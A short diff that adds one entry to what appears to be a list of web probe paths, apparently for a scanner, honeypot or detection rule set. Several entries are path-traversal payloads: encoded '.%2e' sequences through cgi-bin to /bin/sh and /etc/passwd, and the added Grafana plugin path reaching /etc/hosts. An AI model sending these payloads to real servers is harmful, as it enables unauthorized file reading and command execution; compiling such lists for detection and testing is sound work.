@@ -12,6 +12,7 @@
 /s/cfx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
 /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
 /index.php/index/Mytimer
+/public/plugins/alertlist/#/../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/hosts
 /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd
 /vision/mobileX/login
 /vision/index.jsp
